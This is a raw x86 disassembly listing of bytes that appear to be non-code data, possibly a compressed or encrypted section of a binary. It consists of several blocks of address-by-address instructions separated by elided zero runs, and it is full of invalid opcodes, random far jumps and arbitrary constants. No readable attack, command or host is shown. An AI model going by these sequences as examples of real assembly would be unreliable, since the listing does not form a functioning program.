  41f0bd:	sbb    edx,DWORD PTR [edi]
  41f0bf:	es dec ebp
  41f0c1:	xlat   BYTE PTR ds:[ebx]
  41f0c2:	xchg   edi,eax
  41f0c3:	jo     0x41f0fe
  41f0c5:	mov    eax,ds:0x6e6cf0b7
  41f0ca:	push   ecx
  41f0cb:	cmp    eax,ecx
  41f0cd:	adc    eax,0x2609d74a
  41f0d2:	rol    edx,1
  41f0d4:	sub    eax,0xa3335f77
  41f0d9:	sub    DWORD PTR [edi],0x9
  41f0dc:	mov    al,ds:0xc5938602
  41f0e1:	push   eax
  41f0e2:	and    ecx,ebx
  41f0e4:	das    
  41f0e5:	iret   
  41f0e6:	mov    edx,0x69687c58
  41f0eb:	cmp    bl,BYTE PTR [eax]
  41f0ed:	rol    ebx,0x67
  41f0f0:	inc    ecx
  41f0f1:	dec    ebx
  41f0f2:	fidiv  DWORD PTR [ebp-0x4baf9abe]
  41f0f8:	js     0x41f14f
  41f0fa:	jo     0x41f127
  41f0fc:	push   ecx
  41f0fd:	mov    ebx,esi
  41f0ff:	and    DWORD PTR [edx],0x895d1e95
  41f105:	sub    esp,DWORD PTR [edi]
  41f107:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f109:	lods   eax,DWORD PTR ds:[esi]
  41f10a:	call   0x5250ceea
  41f10f:	fild   DWORD PTR [eax]
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xe0874ef9
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	add    BYTE PTR [eax-0x60],dl
  41f18f:	sar    DWORD PTR [ebx+ebx*1],0x90
  41f193:	stc    
  41f194:	xchg   edi,eax
  41f195:	xor    BYTE PTR [edx],0x63
  41f198:	cmp    al,0x4d
  41f19a:	test   DWORD PTR [edx+esi*8-0x1e],eax
  41f19e:	cdq    
  41f19f:	hlt    
  41f1a0:	mov    ds:0x74a9be9a,al
  41f1a5:	xchg   edi,eax
  41f1a6:	rol    BYTE PTR [edi-0x63],0x9c
  41f1aa:	lea    ebp,[eax+0x3c083593]
  41f1b0:	test   ecx,ebx
  41f1b2:	push   es
  41f1b3:	adc    ebx,DWORD PTR ds:0xb5e93cf0
  41f1b9:	inc    ebp
  41f1ba:	aaa    
  41f1bb:	sahf   
  41f1bc:	xor    al,0x14
  41f1be:	cmc    
  41f1bf:	adc    esi,edx
  41f1c1:	mov    edi,0xc21ffb6d
  41f1c6:	in     eax,0x71
  41f1c8:	push   ebx
  41f1c9:	jbe    0x41f174
  41f1cb:	fstp   TBYTE PTR [ebx+0x39]
  41f1ce:	jbe    0x41f24c
  41f1d0:	inc    ebp
  41f1d1:	xor    ebx,DWORD PTR [ecx+0x13d8be12]
  41f1d7:	shr    DWORD PTR [ebx+0x51],cl
  41f1da:	adc    ah,bl
  41f1dc:	or     BYTE PTR [ecx],bl
  41f1de:	cmp    BYTE PTR [edx-0x2b0de36e],cl
  41f1e4:	loop   0x41f197
  41f1e6:	into   
  41f1e7:	ds jp  0x41f22c
  41f1ea:	in     eax,dx
  41f1eb:	jle    0x41f1e5
  41f1ed:	mov    esp,0x46180d2c
  41f1f2:	div    BYTE PTR [ecx-0x57874b6f]
  41f1f8:	out    0xe8,eax
  41f1fa:	ins    DWORD PTR es:[edi],dx
  41f1fb:	inc    ecx
  41f1fc:	mov    eax,ds:0x93ca8b6b
  41f202:	mov    eax,ds:0x18bbcbe
  41f207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f208:	fdivr  st(2),st
  41f20a:	(bad)  
  41f20b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f20c:	in     eax,0x55
  41f20e:	and    al,0xda
  41f210:	or     al,0x12
  41f212:	pop    es
  41f213:	js     0x41f1d3
  41f215:	shl    dl,cl
  41f217:	dec    esp
  41f218:	push   es
  41f219:	hlt    
  41f21a:	out    dx,eax
  41f21b:	mov    edi,0x715e36e8
  41f220:	jae    0x41f267
  41f222:	inc    edi
  41f223:	and    eax,0xc15c97c5
  41f228:	(bad)  
  41f229:	and    eax,0x742ba8b9
  41f22e:	mov    ds:0xb6c58de9,eax
  41f233:	push   eax
  41f234:	shr    BYTE PTR [esi+ecx*2-0x7aae9655],0x15
  41f23c:	rcl    BYTE PTR [ebx-0x64],cl
  41f23f:	icebp  
  41f240:	sbb    eax,0x9b98f09d
  41f245:	mov    WORD PTR [edx],gs
  41f247:	(bad)  
  41f248:	sbb    esp,DWORD PTR [edi]
  41f24a:	sbb    BYTE PTR [eax-0x48],dh
  41f24d:	cmp    eax,DWORD PTR [eax-0x756157d9]
  41f253:	xor    BYTE PTR [eax-0x21c172d4],ah
  41f259:	popa   
  41f25a:	retf   
  41f25b:	pop    ecx
  41f25c:	shl    DWORD PTR [esi+edx*2],0x44
  41f260:	sbb    eax,0xf55a9903
  41f265:	pop    ecx
  41f266:	call   0xdf6f:0x66ebe492
  41f26d:	popa   
  41f26e:	(bad)  
  41f26f:	jne    0x41f2e7
  41f271:	push   esi
  41f272:	xor    al,0xe6
  41f274:	mov    ds:0xe9da7fdc,eax
  41f279:	aas    
  41f27a:	(bad)  
  41f27c:	mov    bl,0x8a
  41f27e:	mov    bh,al
  41f280:	lea    esi,[edi]
  41f282:	mov    ah,0xa2
  41f284:	aaa    
  41f285:	add    al,BYTE PTR [ecx]
  41f287:	mov    bh,0xb8
  41f289:	dec    ebp
  41f28a:	mov    BYTE PTR [edx+0x77ae91bb],0x0
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2f0
  41f301:	sub    edi,esp
  41f303:	lea    edi,[ebx+ecx*2+0x1040001]
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	or     al,0x2
  41f30e:	mov    ch,0xed
  41f310:	daa    
  41f311:	lds    eax,FWORD PTR [ecx+ebp*2]
  41f314:	test   DWORD PTR [ebp+eax*2-0x4b],0xcf03fdf5
  41f31c:	mov    esp,0x62fc69b7
  41f321:	jbe    0x41f394
  41f323:	cmp    dl,ah
  41f325:	in     al,dx
  41f326:	dec    esp
  41f327:	pusha  
  41f328:	inc    edi
  41f329:	cmc    
  41f32a:	nop
  41f32b:	(bad)  
  41f32c:	xor    bh,BYTE PTR ds:0x8f823987
  41f332:	push   es
  41f333:	lods   eax,DWORD PTR ds:[esi]
  41f334:	xor    eax,0x6905c0b0
  41f339:	pop    ecx
  41f33a:	xchg   ebp,eax
  41f33b:	push   0xffffff9f
  41f33d:	mov    eax,0xbc667427
  41f342:	pop    edx
  41f343:	mov    ch,0xff
  41f345:	jp     0x41f3bb
  41f347:	mov    edx,0x58aeec8a
  41f34c:	mov    BYTE PTR [ebx+edi*8],bl
  41f34f:	call   0x430c:0xc3aea067
  41f356:	xchg   ebx,eax
  41f357:	dec    edi
  41f358:	mov    ds:0xdbd0fb34,al
  41f35d:	in     eax,dx
  41f35e:	pop    ecx
  41f35f:	and    esp,edi
  41f361:	pop    ebx
  41f362:	std    
  41f363:	mov    dh,bh
  41f365:	lods   al,BYTE PTR ds:[esi]
  41f366:	mov    gs,WORD PTR [ecx+0x41594996]
  41f36c:	loope  0x41f2fd
  41f36e:	out    0x72,al
  41f370:	xor    al,0x96
  41f372:	dec    esp
  41f373:	sti    
  41f374:	sub    al,0x7b
  41f376:	cs call 0x67ca0de0
  41f37c:	retf   
  41f37d:	les    eax,FWORD PTR [ebx]
  41f37f:	mov    ebx,0xb6688e5d
  41f384:	iret   
  41f385:	cld    
  41f386:	xor    ebp,ebp
  41f388:	mov    ecx,0xd9ef916c
  41f38d:	dec    esp
  41f38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f38f:	jnp    0x41f410
  41f391:	aam    0xd
  41f393:	jge    0x41f3d0
  41f395:	aaa    
  41f396:	jnp    0x41f3a6
  41f398:	or     BYTE PTR [ebp+0x247f80cb],cl
  41f39e:	cmp    BYTE PTR [eax-0x54],ch
  41f3a1:	cli    
  41f3a2:	icebp  
  41f3a3:	add    DWORD PTR ds:0xa147e715,0x37
  41f3aa:	mov    dl,BYTE PTR [edx+0x4bc3e8fd]
  41f3b0:	(bad)  [esi]
  41f3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3b3:	mov    eax,0x2b622c5b
  41f3b8:	jns    0x41f366
  41f3ba:	rcr    DWORD PTR [edi+0x8],1
  41f3bd:	mov    eax,0xc53d49cd
  41f3c2:	mov    ecx,0xef0946b5
  41f3c7:	or     esp,DWORD PTR [eax]
  41f3c9:	add    ch,dh
  41f3cb:	jns    0x41f43d
  41f3cd:	sti    
  41f3ce:	or     cl,BYTE PTR [edx+0x532c492b]
  41f3d4:	rcr    BYTE PTR [edx],cl
  41f3d6:	fistp  QWORD PTR ds:0xb67ccda5
  41f3dc:	imul   ebp,DWORD PTR [ebp-0x3bef7151],0x17c5bb4f
  41f3e6:	in     al,dx
  41f3e7:	cmp    BYTE PTR [esp+esi*8-0x69],dl
  41f3eb:	shl    BYTE PTR [edx+ecx*4],cl
  41f3ee:	shr    DWORD PTR [edi],cl
  41f3f0:	push   eax
  41f3f1:	sub    eax,0x672baa44
  41f3f6:	in     eax,0x97
  41f3f8:	push   ebp
  41f3f9:	xchg   edx,eax
  41f3fa:	push   esi
  41f3fb:	sbb    al,0x59
  41f3fd:	lods   al,BYTE PTR ds:[esi]
  41f3fe:	call   0xfc509436
  41f403:	push   ss
  41f404:	and    al,0x91
  41f406:	pop    esp
  41f407:	mov    ds,WORD PTR [edx-0x78]
  41f40a:	mov    eax,0x5d6fe38f
  41f40f:	hlt    
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xe3
  41f481:	push   eax
  41f482:	sbb    dl,BYTE PTR [ebx]
  41f484:	ror    BYTE PTR [ecx+eax*1+0x0],0x4
  41f489:	add    DWORD PTR [eax],eax
  41f48b:	add    BYTE PTR [eax+0x3e],ch
  41f48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f48f:	inc    edi
  41f490:	mov    ebx,DWORD PTR [edx+0xb]
  41f493:	adc    esi,DWORD PTR [esi+0x4c356fb2]
  41f499:	xchg   ecx,eax
  41f49a:	inc    ecx
  41f49b:	jl     0x41f483
  41f49d:	sbb    al,0x40
  41f49f:	push   esi
  41f4a0:	into   
  41f4a1:	dec    esp
  41f4a2:	mov    ebx,gs
  41f4a4:	dec    edx
  41f4a5:	fstp   DWORD PTR [edi+0x4bf2df71]
  41f4ab:	mov    ah,0x7b
  41f4ad:	or     eax,0xdb69b63
  41f4b2:	mov    ecx,0xb0a9d75d
  41f4b7:	std    
  41f4b8:	or     DWORD PTR [edx],esi
  41f4ba:	mov    ecx,0x210bb3c1
  41f4bf:	out    dx,eax
  41f4c0:	mov    ds:0xc3a7b24e,eax
  41f4c5:	mov    ds:0x35ae7717,eax
  41f4ca:	dec    ebx
  41f4cb:	jmp    0xa5c9:0x17dcb44d
  41f4d2:	(bad)  
  41f4d4:	outs   dx,DWORD PTR ds:[esi]
  41f4d5:	test   eax,0xaa2ebc37
  41f4da:	jle    0x41f4a8
  41f4dc:	add    al,bh
  41f4de:	int3   
  41f4df:	(bad)  [ecx+0x6d]
  41f4e2:	nop
  41f4e3:	mov    eax,0xf6dddd
  41f4e8:	out    dx,al
  41f4e9:	sbb    al,0x9e
  41f4eb:	dec    BYTE PTR [eax-0x6c01d0a8]
  41f4f1:	add    eax,0xab4821e0
  41f4f6:	and    eax,0x626e31de
  41f4fb:	pop    edi
  41f4fc:	jecxz  0x41f563
  41f4fe:	sbb    ch,BYTE PTR [ecx+0x87875d7]
  41f504:	xchg   esi,eax
  41f505:	shr    BYTE PTR [edi+0x14],1
  41f508:	(bad)  
  41f509:	sub    al,0x69
  41f50b:	data16 sbb ah,ch
  41f50e:	(bad)
  41f512:	pop    ss
  41f513:	inc    ecx
  41f514:	jecxz  0x41f4fb
  41f516:	and    al,0x52
  41f518:	cs ja  0x41f506
  41f51b:	dec    esp
  41f51c:	sub    al,0x47
  41f51e:	ins    BYTE PTR es:[edi],dx
  41f51f:	mov    ds:0x62735c58,eax
  41f524:	push   cs
  41f525:	(bad)  
  41f526:	(bad)  [eax+0x4c62b0e3]
  41f52c:	hlt    
  41f52d:	imul   ecx,DWORD PTR [ebp+0x62],0xffffffb7
  41f531:	add    BYTE PTR [esi],bl
  41f533:	test   DWORD PTR [ecx+0x5ef8da24],edx
  41f539:	fstp   DWORD PTR [ebx-0x23]
  41f53c:	pop    ebp
  41f53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f53e:	scas   al,BYTE PTR es:[edi]
  41f53f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f540:	push   esi
  41f541:	js     0x41f558
  41f543:	in     al,dx
  41f544:	pop    ss
  41f545:	cmp    DWORD PTR [ecx+esi*2+0x12],edx
  41f549:	and    DWORD PTR [edx-0x78],ebx
  41f54c:	mov    ecx,0x6c6b1c44
  41f551:	push   ss
  41f552:	jno    0x41f546
  41f554:	cmp    DWORD PTR [esi-0x4b],edi
  41f557:	jno    0x41f58c
  41f559:	mov    al,ds:0x4603c54d
  41f55e:	jle    0x41f4f8
  41f560:	into   
  41f561:	enter  0x6f4,0x86
  41f565:	xchg   edi,eax
  41f566:	pop    esp
  41f567:	sbb    ch,ah
  41f569:	cmp    edi,DWORD PTR [edi+0x5f]
  41f56c:	popf   
  41f56d:	jbe    0x41f554
  41f56f:	xlat   BYTE PTR ds:[ebx]
  41f570:	or     al,0x1a
  41f572:	mov    dh,BYTE PTR [eax-0x5f]
  41f575:	daa    
  41f576:	addr16 jmp 0x41f5e6
  41f579:	out    0x5a,al
  41f57b:	hlt    
  41f57c:	sbb    DWORD PTR [esi-0x2b3e6d40],0x5ac41745
  41f586:	inc    ebp
  41f587:	push   ss
  41f588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f58a:	lea    edi,[ecx-0x10]
  41f58d:	mov    ah,0xd5
  41f58f:	or     eax,DWORD PTR [eax]
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0xfea2:0x46a3d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	popf   
  41f60d:	cld    
  41f60e:	test   eax,0xe25aec36
  41f613:	jns    0x41f597
  41f615:	sub    eax,0xf576e5cb
  41f61a:	dec    ecx
  41f61b:	jmp    0x41f66e
  41f61d:	push   0x895a9c80
  41f622:	retf   0xa430
  41f625:	lds    edi,FWORD PTR [ebx-0x10236c97]
  41f62b:	adc    al,0xaa
  41f62d:	mov    DWORD PTR [edi],edi
  41f62f:	cmp    BYTE PTR [ebx],ch
  41f631:	mov    ch,BYTE PTR [ebx]
  41f633:	fild   DWORD PTR [ebx+0x78]
  41f636:	mov    bl,0x2b
  41f638:	inc    edx
  41f639:	xchg   ebx,eax
  41f63a:	sbb    esi,eax
  41f63c:	fdivr  DWORD PTR ds:0x1e3c82ed
  41f642:	and    BYTE PTR [edi+ebx*8-0x35],al
  41f646:	push   ss
  41f647:	jno    0x41f682
  41f649:	cld    
  41f64a:	sub    eax,0xa8c40e0c
  41f64f:	xchg   edx,eax
  41f650:	cmp    ah,BYTE PTR [edx+0x31da191]
  41f656:	in     eax,0x8f
  41f658:	sub    al,0x57
  41f65a:	jmp    0x51c5:0x8c22ccc7
  41f661:	or     ah,BYTE PTR [ebx+0xac17684]
  41f667:	xor    edx,ebx
  41f669:	sub    eax,0x1703731
  41f66e:	lea    edx,[eax-0x46525a85]
  41f674:	jnp    0x41f638
  41f676:	fs retf 
  41f678:	xlat   BYTE PTR ds:[ebx]
  41f679:	dec    edx
  41f67a:	and    dl,bl
  41f67c:	out    0xa1,eax
  41f67e:	xor    eax,0xc31d11ef
  41f683:	shrd   DWORD PTR fs:[ebp+0x6d],ebx,cl
  41f688:	or     eax,0x40ff9a9
  41f68d:	pop    ebp
  41f68e:	dec    ebp
  41f68f:	pushf  
  41f690:	icebp  
  41f691:	rol    BYTE PTR [ebp-0x73],1
  41f694:	outs   dx,BYTE PTR ds:[esi]
  41f695:	mov    ecx,0xae1ab98c
  41f69a:	arpl   WORD PTR [eax],bx
  41f69c:	jbe    0x41f666
  41f69e:	cmp    eax,edx
  41f6a0:	jmp    0x7ad9:0xa65c9538
  41f6a7:	mov    ebx,0xadf20a1
  41f6ac:	sbb    eax,0x5ef81b9
  41f6b1:	dec    ebp
  41f6b2:	xchg   ecx,eax
  41f6b3:	jo     0x41f6b9
  41f6b5:	cmp    BYTE PTR [esi-0x56],dl
  41f6b8:	(bad)  
  41f6b9:	push   edx
  41f6ba:	lods   al,BYTE PTR ds:[esi]
  41f6bb:	(bad)  
  41f6bc:	icebp  
  41f6bd:	sbb    al,0x28
  41f6bf:	fs mov bh,0x48
  41f6c2:	ja     0x41f714
  41f6c4:	out    dx,al
  41f6c5:	add    al,0x31
  41f6c7:	hlt    
  41f6c8:	sbb    DWORD PTR [edi],esp
  41f6ca:	neg    BYTE PTR [edi-0x7e]
  41f6cd:	loop   0x41f728
  41f6cf:	lds    edx,FWORD PTR [eax]
  41f6d1:	hlt    
  41f6d2:	sti    
  41f6d3:	add    BYTE PTR [eax+ecx*1],al
  41f6d6:	rcl    esp,0x4
  41f6d9:	and    DWORD PTR ds:0xd8200136,0xffffff82
  41f6e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6e1:	call   0x8f134c
  41f6e6:	loope  0x41f721
  41f6e8:	rcl    DWORD PTR [esi-0x1b97e7d8],0x7
  41f6ef:	loopne 0x41f6b1
  41f6f1:	xchg   ebp,eax
  41f6f2:	ret    0x8c2c
  41f6f5:	ficom  DWORD PTR [edx]
  41f6f7:	xor    al,0x50
  41f6f9:	fwait
  41f6fa:	inc    eax
  41f6fb:	fsub   st,st(7)
  41f6fd:	cmp    ch,BYTE PTR [eax-0x50e7770e]
  41f703:	ins    DWORD PTR es:[edi],dx
  41f704:	mov    esi,0xfd98fbb5
  41f709:	fwait
  41f70a:	inc    ebp
  41f70b:	push   cs
  41f70c:	nop
  41f70d:	add    ecx,eax
  41f70f:	popa   
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x2121:0xd66c62d2
  41f783:	stc    
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	add    cl,BYTE PTR [esi-0x2ce2ab15]
  41f792:	xor    esi,DWORD PTR [esi+0x25]
  41f795:	cmp    ah,BYTE PTR [ebp+0x419bbabd]
  41f79b:	pop    ebx
  41f79c:	das    
  41f79d:	push   esi
  41f79e:	lods   eax,DWORD PTR ds:[esi]
  41f79f:	outs   dx,DWORD PTR ds:[esi]
  41f7a0:	js     0x41f730
  41f7a2:	push   0x1
  41f7a4:	mov    al,ds:0x501d255c
  41f7a9:	dec    esp
  41f7aa:	mov    ebx,0xc8d98ad1
  41f7af:	cdq    
  41f7b0:	daa    
  41f7b1:	iret   
  41f7b2:	xchg   esp,eax
  41f7b3:	mov    ebp,0x8ff62352
  41f7b8:	lahf   
  41f7b9:	inc    esi
  41f7ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7bb:	out    0x6,eax
  41f7bd:	xchg   esp,eax
  41f7be:	(bad)  
  41f7bf:	push   esi
  41f7c0:	retf   0xf7c9
  41f7c3:	ret    0xdf38
  41f7c6:	je     0x41f7a2
  41f7c8:	imul   esi,DWORD PTR [ebp-0x5575f08b],0x1
  41f7cf:	call   DWORD PTR [ecx]
  41f7d1:	js     0x41f788
  41f7d3:	ins    BYTE PTR es:[edi],dx
  41f7d4:	sbb    ebp,esp
  41f7d6:	dec    esp
  41f7d7:	(bad)  
  41f7d8:	int3   
  41f7d9:	shl    DWORD PTR [ebx-0x4a],cl
  41f7dc:	push   eax
  41f7dd:	cld    
  41f7de:	out    dx,al
  41f7df:	in     eax,dx
  41f7e0:	dec    ebp
  41f7e1:	arpl   WORD PTR ds:0xfd63904f,si
  41f7e7:	pop    ecx
  41f7e8:	icebp  
  41f7e9:	cld    
  41f7ea:	je     0x41f849
  41f7ec:	pop    eax
  41f7ed:	pop    ds
  41f7ee:	int3   
  41f7ef:	lahf   
  41f7f0:	popa   
  41f7f1:	add    esp,DWORD PTR [esi-0x626950b1]
  41f7f7:	enter  0x55ef,0x5c
  41f7fb:	pop    es
  41f7fc:	fidivr DWORD PTR [edx-0x24c402e0]
  41f802:	in     al,0xeb
  41f804:	xchg   ebx,eax
  41f805:	imul   edi,DWORD PTR [esp+edx*8],0x56fdde1c
  41f80c:	cmp    DWORD PTR ds:[edi],eax
  41f80f:	ret    
  41f810:	cmp    eax,0x3684c804
  41f815:	cdq    
  41f816:	push   esi
  41f817:	jmp    0x75d7898d
  41f81c:	cmp    DWORD PTR [edi+edi*8+0x556b9785],0x32e6c582
  41f827:	xchg   ecx,eax
  41f828:	scas   al,BYTE PTR es:[edi]
  41f829:	xchg   esi,eax
  41f82a:	mov    esp,0x61eda2aa
  41f82f:	jp     0x41f814
  41f831:	mov    ds:0xf9936a1d,eax
  41f836:	add    bl,ah
  41f838:	mul    BYTE PTR [eax+0x428123b1]
  41f83e:	cld    
  41f83f:	inc    esp
  41f840:	xor    BYTE PTR [eax-0x530b547a],al
  41f846:	gs jb  0x41f7db
  41f849:	jns    0x41f895
  41f84b:	and    ebx,0xffffffbd
  41f84e:	ins    DWORD PTR es:[edi],dx
  41f84f:	ins    DWORD PTR es:[edi],dx
  41f850:	xchg   DWORD PTR [ebx],ebx
  41f852:	pop    edi
  41f853:	mov    BYTE PTR [ecx-0x73004f63],ah
  41f859:	add    bl,al
  41f85b:	or     eax,0x72bab7d3
  41f860:	jecxz  0x41f8ab
  41f862:	pop    esp
  41f863:	or     BYTE PTR [esi+edx*4-0x3a],0x3e
  41f868:	popf   
  41f869:	jmp    0x7c8a67e
  41f86e:	cld    
  41f86f:	or     al,0x14
  41f871:	imul   edx,DWORD PTR [edi-0x7e],0xc9a42af5
  41f878:	rcr    BYTE PTR ds:0xc4d8cee5,0xe1
  41f87f:	jecxz  0x41f808
  41f881:	sbb    DWORD PTR ds:0xdcef5e9d,esp
  41f887:	cmp    al,0xbe
  41f889:	leave  
  41f88a:	fidivr WORD PTR [esi-0x65]
  41f88d:	mov    esp,0x655d
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	inc    DWORD PTR [ecx+0x4fcc2bed]
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	adc    DWORD PTR [edi-0x4efe0c96],ebp
  41f912:	jp     0x41f8f3
  41f914:	(bad)  
  41f915:	jmp    0xe60a:0x313ad314
  41f91c:	jecxz  0x41f8f6
  41f91e:	fcomi  st,st(5)
  41f920:	push   ecx
  41f921:	adc    eax,0x77fa6724
  41f926:	mov    edi,0xf6cd7410
  41f92b:	add    al,0xde
  41f92d:	pop    es
  41f92e:	mov    bl,0x75
  41f930:	pop    ebx
  41f931:	pop    esp
  41f932:	jne    0x41f993
  41f934:	jmp    0xb0bf2360
  41f939:	push   0xffffff9e
  41f93b:	mov    al,ds:0x49997417
  41f940:	hlt    
  41f941:	(bad)  
  41f942:	call   0x5b30:0x753fc3a2
  41f949:	(bad)  
  41f94a:	adc    ebp,0x4a
  41f94d:	ficom  WORD PTR [edx+0x7e]
  41f950:	cmp    BYTE PTR [ebx-0x2139e98d],al
  41f956:	mov    bl,0x51
  41f958:	xlat   BYTE PTR ds:[ebx]
  41f959:	cmp    al,0x4a
  41f95b:	xchg   cl,dl
  41f95d:	in     eax,dx
  41f95e:	or     al,0x89
  41f960:	cmp    DWORD PTR es:[ecx-0x4a],esp
  41f964:	jmp    0x1def9655
  41f969:	inc    edi
  41f96a:	stos   DWORD PTR es:[edi],eax
  41f96b:	pop    ss
  41f96c:	mov    es,WORD PTR [ebx-0x4a]
  41f96f:	add    edx,DWORD PTR [ebp-0x200b26ea]
  41f975:	xchg   BYTE PTR ss:[edi-0x12570120],dl
  41f97c:	dec    edi
  41f97d:	(bad)  
  41f97e:	sub    eax,0x1b3225d1
  41f983:	mov    fs,WORD PTR [ebp-0x13]
  41f986:	pop    esi
  41f987:	xor    dh,BYTE PTR ds:0x468de0b
  41f98d:	mov    bh,0x1d
  41f98f:	lds    eax,FWORD PTR [eax]
  41f991:	sub    eax,0xae01f786
  41f996:	(bad)
  41f999:	sbb    ecx,DWORD PTR [ecx]
  41f99b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f99c:	and    BYTE PTR [ecx+0x5e],bl
  41f99f:	je     0x41f935
  41f9a1:	mov    ds:0x7343088,eax
  41f9a6:	repnz stc 
  41f9a8:	and    edx,DWORD PTR [edi-0x19b3771f]
  41f9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9af:	fwait
  41f9b0:	pop    eax
  41f9b1:	rol    DWORD PTR [ecx-0x4a79310c],1
  41f9b7:	mov    WORD PTR [eax-0x58],es
  41f9ba:	out    0x3c,eax
  41f9bc:	or     al,0x3b
  41f9be:	std    
  41f9bf:	fiadd  WORD PTR gs:[esi-0x66]
  41f9c3:	xchg   edx,eax
  41f9c4:	sahf   
  41f9c5:	mov    ds:0x3d12aaaa,al
  41f9ca:	push   DWORD PTR [edi]
  41f9cc:	das    
  41f9cd:	adc    al,0x2c
  41f9cf:	outs   dx,BYTE PTR ds:[esi]
  41f9d0:	cmp    ch,cl
  41f9d2:	icebp  
  41f9d3:	jl     0x41f9a1
  41f9d5:	outs   dx,BYTE PTR ds:[esi]
  41f9d6:	xchg   BYTE PTR [edx+0x50ad548d],dl
  41f9dc:	rcr    DWORD PTR [ebp+0x1],0x8d
  41f9e0:	cmp    edx,ebx
  41f9e2:	xchg   DWORD PTR [esi+esi*4+0x150bfded],ebx
  41f9e9:	int    0x94
  41f9eb:	sub    eax,0x3dd3aba
  41f9f0:	loopne 0x41f9ea
  41f9f2:	pop    ecx
  41f9f3:	fs dec ebx
  41f9f5:	add    al,0x7c
  41f9f7:	nop
  41f9f8:	mov    BYTE PTR [edx-0x30],dl
  41f9fb:	je     0x41fa64
  41f9fd:	xor    ebp,DWORD PTR [edx]
  41f9ff:	mov    ss,WORD PTR [edx+0x48cf5670]
  41fa05:	stos   DWORD PTR es:[edi],eax
  41fa06:	retf   0x3b0e
  41fa09:	mov    esi,esi
  41fa0b:	jge    0x41fa38
  41fa0d:	cld    
  41fa0e:	xor    edx,0x0
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x416cb8d1
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	(bad)  
  41fa8d:	enter  0x75cf,0xeb
  41fa91:	mov    ebx,0x8c8c3939
  41fa96:	call   0x2dd0:0xa565d44a
  41fa9d:	fs mov ?,edi
  41faa0:	sub    ch,BYTE PTR [edi]
  41faa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faa3:	pop    ebp
  41faa4:	in     al,0x57
  41faa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faa7:	adc    esi,DWORD PTR [edi+0xb978b38]
  41faad:	das    
  41faae:	ficom  WORD PTR [ecx-0x42ff8030]
  41fab4:	idiv   BYTE PTR [edi]
  41fab6:	sub    ebx,DWORD PTR [ebp+0x7d3eb20b]
  41fabc:	mov    ebp,DWORD PTR [edi+0x10a305ca]
  41fac2:	mov    bh,0x1
  41fac4:	jns    0x41fac3
  41fac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fac7:	mov    ds:0xd83c9e87,al
  41facc:	pop    esp
  41facd:	cdq    
  41face:	aam    0xa2
  41fad0:	std    
  41fad1:	mov    al,ds:0x391d4d80
  41fad6:	inc    edx
  41fad7:	pop    ebx
  41fad8:	jbe    0x41fb43
  41fada:	xor    ecx,esi
  41fadc:	pop    edi
  41fadd:	retf   0xf924
  41fae0:	jbe    0x41fad2
  41fae2:	or     ch,BYTE PTR [eax+0x2dbd7718]
  41fae8:	shl    ebx,1
  41faea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faeb:	in     al,dx
  41faec:	cs mov esp,0xe2fd3184
  41faf2:	fimul  DWORD PTR [eax+0x24]
  41faf5:	cld    
  41faf6:	pop    es
